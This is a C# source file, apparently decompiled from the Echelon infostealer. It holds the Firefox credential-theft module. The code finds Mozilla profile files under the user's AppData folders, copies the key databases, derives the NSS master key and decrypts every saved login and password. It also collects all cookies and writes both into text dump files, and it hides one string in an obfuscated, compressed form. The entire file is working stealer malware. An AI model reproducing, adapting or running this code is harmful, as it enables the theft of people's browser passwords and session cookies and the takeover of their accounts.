using Decoder;
using Echelon;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Data;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

internal class aa
{
	public static int a = 0;

	public static int b = 0;

	public static List<string> c = new List<string>();

	public static List<string> d = new List<string>();

	public static List<string> e = new List<string>();

	public static List<string> f = new List<string>();

	public static readonly string g = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Local");

	public static readonly string h = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Local\\Temp");

	public static readonly string i = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Roaming");

	public static readonly byte[] j = new byte[16]
	{
		248,
		0,
		0,
		0,
		0,
		0,
		0,
		0,
		0,
		0,
		0,
		0,
		0,
		0,
		0,
		1
	};

	public static List<string> k = new List<string>();

	public static List<string> a(string hc, int hd = 4, int he = 1, params string[] hf)
	{
		List<string> list = new List<string>();
		if (hf == null || hf.Length == 0 || he > hd)
		{
			return list;
		}
		try
		{
			string[] directories = Directory.GetDirectories(hc);
			foreach (string path in directories)
			{
				try
				{
					DirectoryInfo directoryInfo = new DirectoryInfo(path);
					FileInfo[] files = directoryInfo.GetFiles();
					bool flag = false;
					for (int j = 0; j < files.Length; j++)
					{
						if (flag)
						{
							break;
						}
						for (int k = 0; k < hf.Length; k++)
						{
							if (flag)
							{
								break;
							}
							string obj = hf[k];
							FileInfo fileInfo = files[j];
							if (obj == fileInfo.Name)
							{
								flag = true;
								list.Add(fileInfo.FullName);
							}
						}
					}
					foreach (string item in a(directoryInfo.FullName, hd, he + 1, hf))
					{
						if (!list.Contains(item))
						{
							list.Add(item);
						}
					}
					directoryInfo = null;
				}
				catch
				{
				}
			}
			return list;
		}
		catch
		{
			return list;
		}
	}

	public static void b(string hg, string hh, string hi)
	{
		try
		{
			if (File.Exists(Path.Combine(hg, "key3.db")))
			{
				i(hg, k(f(Path.Combine(hg, "key3.db"))), hh, hi);
			}
			i(hg, j(f(Path.Combine(hg, "key4.db"))), hh, hi);
		}
		catch
		{
		}
	}

	public static void c(string hj)
	{
		List<string> list = new List<string>();
		list.AddRange(a(aa.g, 4, 1, "key3.db", "key4.db", "cookies.sqlite", "logins.json"));
		list.AddRange(a(aa.i, 4, 1, "key3.db", "key4.db", "cookies.sqlite", "logins.json"));
		foreach (string item in list)
		{
			string fullName = new FileInfo(item).Directory.FullName;
			string ho = item.Contains(aa.i) ? n(fullName) : o(fullName);
			string hp = e(fullName);
			h(fullName, ho, hp);
			string text = "";
			foreach (string item2 in aa.d)
			{
				text += item2;
			}
			if (text != "")
			{
				File.WriteAllText(hj + "\\Cookies_Mozilla.txt", text, Encoding.Default);
			}
		}
	}

	public static void d(string hk)
	{
		List<string> list = new List<string>();
		list.AddRange(a(aa.g, 4, 1, "key3.db", "key4.db", "cookies.sqlite", "logins.json"));
		list.AddRange(a(aa.i, 4, 1, "key3.db", "key4.db", "cookies.sqlite", "logins.json"));
		foreach (string item in list)
		{
			string fullName = new FileInfo(item).Directory.FullName;
			string hh = item.Contains(aa.i) ? n(fullName) : o(fullName);
			string hi = e(fullName);
			b(fullName, hh, hi);
			string text = "";
			foreach (string item2 in aa.k)
			{
				text = text + item2 + Environment.NewLine;
			}
			if (text != "")
			{
				File.WriteAllText(hk + "\\Passwords_Mozilla.txt", text, Encoding.Default);
			}
		}
	}

	private static string e(string hl)
	{
		try
		{
			string[] array = hl.Split(new char[1]
			{
				'\\'
			}, StringSplitOptions.RemoveEmptyEntries);
			return array[array.Length - 1];
		}
		catch
		{
		}
		return "Unknown";
	}

	public static string f(string hm)
	{
		string text = g();
		File.Copy(hm, text, overwrite: true);
		return text;
	}

	public static string g()
	{
		return Path.Combine(aa.h, "tempDataBase" + DateTime.Now.ToString("O").Replace(':', '_') + Thread.CurrentThread.GetHashCode() + Thread.CurrentThread.ManagedThreadId);
	}

	public static void h(string hn, string ho, string hp)
	{
		try
		{
			CNT cNT = new CNT(f(Path.Combine(hn, "cookies.sqlite")));
			cNT.ReadTable("moz_cookies");
			for (int i = 0; i < cNT.RowLength; i++)
			{
				try
				{
					aa.c.Add(cNT.ParseValue(i, "host").Trim());
					aa.d.Add(cNT.ParseValue(i, "host").Trim() + "\t" + (cNT.ParseValue(i, "isSecure") == "1") + "\t" + cNT.ParseValue(i, "path").Trim() + "\t" + (cNT.ParseValue(i, "isSecure") == "1") + "\t" + cNT.ParseValue(i, "expiry").Trim() + "\t" + cNT.ParseValue(i, "name").Trim() + "\t" + cNT.ParseValue(i, "value") + Environment.NewLine);
					aa.b++;
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
	}

	public static void i(string hq, byte[] hr, string hs, string ht)
	{
		try
		{
			string path = f(Path.Combine(hq, "logins.json"));
			if (File.Exists(path))
			{
				foreach (JsonValue item in (IEnumerable)File.ReadAllText(path).FromJSON()["logins"])
				{
					Gecko4 gecko = Gecko1.Create(Convert.FromBase64String(item["encryptedUsername"].ToString(saving: false)));
					Gecko4 gecko2 = Gecko1.Create(Convert.FromBase64String(item["encryptedPassword"].ToString(saving: false)));
					string text = Regex.Replace(Gecko6.lTRjlt(hr, gecko.Objects[0].Objects[1].Objects[1].ObjectData, gecko.Objects[0].Objects[2].ObjectData, PaddingMode.PKCS7), "[^\\u0020-\\u007F]", string.Empty);
					string text2 = Regex.Replace(Gecko6.lTRjlt(hr, gecko2.Objects[0].Objects[1].Objects[1].ObjectData, gecko2.Objects[0].Objects[2].ObjectData, PaddingMode.PKCS7), "[^\\u0020-\\u007F]", string.Empty);
					aa.f.Add(string.Concat("URL : ", item["hostname"], Environment.NewLine, "Login: ", text, Environment.NewLine, "Password: ", text2, Environment.NewLine));
					aa.k.Add(string.Concat("URL : ", item["hostname"], Environment.NewLine, "Login: ", text, Environment.NewLine, "Password: ", text2, Environment.NewLine));
					aa.a++;
				}
				for (int i = 0; i < aa.f.Count(); i++)
				{
					aa.k.Add("Browser : " + hs + Environment.NewLine + "Profile : " + ht + Environment.NewLine + aa.f[i]);
				}
				aa.f.Clear();
			}
		}
		catch
		{
		}
	}

	private static byte[] j(string hu)
	{
		byte[] result = new byte[24];
		try
		{
			if (!File.Exists(hu))
			{
				return result;
			}
			CNT cNT = new CNT(hu);
			cNT.ReadTable("metaData");
			string s = cNT.ParseValue(0, "item1");
			string s2 = cNT.ParseValue(0, Echelon_Decod.Ok("H4sIAAAAAAAEAMssSc01AgBLmMXgBQAAAA==)"));
			Gecko4 gecko = Gecko1.Create(Encoding.Default.GetBytes(s2));
			byte[] objectData = gecko.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData;
			byte[] objectData2 = gecko.Objects[0].Objects[1].ObjectData;
			Gecko8 gecko2 = new Gecko8(Encoding.Default.GetBytes(s), Encoding.Default.GetBytes(string.Empty), objectData);
			gecko2.го7па();
			Gecko6.lTRjlt(gecko2.DataKey, gecko2.DataIV, objectData2);
			cNT.ReadTable("nssPrivate");
			int rowLength = cNT.RowLength;
			string s3 = string.Empty;
			for (int i = 0; i < rowLength; i++)
			{
				if (cNT.ParseValue(i, "a102") == Encoding.Default.GetString(aa.j))
				{
					s3 = cNT.ParseValue(i, "a11");
					break;
				}
			}
			Gecko4 gecko3 = Gecko1.Create(Encoding.Default.GetBytes(s3));
			objectData = gecko3.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData;
			objectData2 = gecko3.Objects[0].Objects[1].ObjectData;
			gecko2 = new Gecko8(Encoding.Default.GetBytes(s), Encoding.Default.GetBytes(string.Empty), objectData);
			gecko2.го7па();
			result = Encoding.Default.GetBytes(Gecko6.lTRjlt(gecko2.DataKey, gecko2.DataIV, objectData2, PaddingMode.PKCS7));
			return result;
		}
		catch
		{
			return result;
		}
	}

	private static byte[] k(string hv)
	{
		byte[] array = new byte[24];
		try
		{
			if (!File.Exists(hv))
			{
				return array;
			}
			new DataTable();
			Gecko9 hx = new Gecko9(hv);
			Gecko7 gecko = new Gecko7(m(hx, (string ib) => ib.Equals("password-check")));
			string hw = m(hx, (string ic) => ic.Equals("global-salt"));
			Gecko8 gecko2 = new Gecko8(l(hw), Encoding.Default.GetBytes(string.Empty), l(gecko.EntrySalt));
			gecko2.го7па();
			Gecko6.lTRjlt(gecko2.DataKey, gecko2.DataIV, l(gecko.Passwordcheck));
			Gecko4 gecko3 = Gecko1.Create(l(m(hx, (string id) => !id.Equals("password-check") && !id.Equals("Version") && !id.Equals("global-salt"))));
			Gecko8 gecko4 = new Gecko8(l(hw), Encoding.Default.GetBytes(string.Empty), gecko3.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData);
			gecko4.го7па();
			Gecko4 gecko5 = Gecko1.Create(Gecko1.Create(Encoding.Default.GetBytes(Gecko6.lTRjlt(gecko4.DataKey, gecko4.DataIV, gecko3.Objects[0].Objects[1].ObjectData))).Objects[0].Objects[2].ObjectData);
			if (gecko5.Objects[0].Objects[3].ObjectData.Length <= 24)
			{
				array = gecko5.Objects[0].Objects[3].ObjectData;
				return array;
			}
			Array.Copy(gecko5.Objects[0].Objects[3].ObjectData, gecko5.Objects[0].Objects[3].ObjectData.Length - 24, array, 0, 24);
			return array;
		}
		catch
		{
			return array;
		}
	}

	public static byte[] l(string hw)
	{
		if (hw.Length % 2 != 0)
		{
			throw new ArgumentException(string.Format(CultureInfo.InvariantCulture, "The binary key cannot have an odd number of digits: {0}", hw));
		}
		byte[] array = new byte[hw.Length / 2];
		for (int i = 0; i < array.Length; i++)
		{
			string s = hw.Substring(i * 2, 2);
			array[i] = byte.Parse(s, NumberStyles.HexNumber, CultureInfo.InvariantCulture);
		}
		return array;
	}

	private static string m(Gecko9 hx, Func<string, bool> hy)
	{
		string text = string.Empty;
		try
		{
			foreach (KeyValuePair<string, string> key in hx.Keys)
			{
				if (hy(key.Key))
				{
					text = key.Value;
				}
			}
		}
		catch
		{
		}
		return text.Replace("-", string.Empty);
	}

	private static string n(string hz)
	{
		string text = string.Empty;
		try
		{
			string[] array = hz.Split(new string[1]
			{
				"AppData\\Roaming\\"
			}, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[1]
			{
				'\\'
			}, StringSplitOptions.RemoveEmptyEntries);
			text = ((!(array[2] == "Profiles")) ? array[0] : array[1]);
		}
		catch
		{
		}
		return text.Replace(" ", string.Empty);
	}

	private static string o(string ia)
	{
		string text = string.Empty;
		try
		{
			string[] array = ia.Split(new string[1]
			{
				"AppData\\Local\\"
			}, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[1]
			{
				'\\'
			}, StringSplitOptions.RemoveEmptyEntries);
			text = ((!(array[2] == "Profiles")) ? array[0] : array[1]);
		}
		catch
		{
		}
		return text.Replace(" ", string.Empty);
	}
}
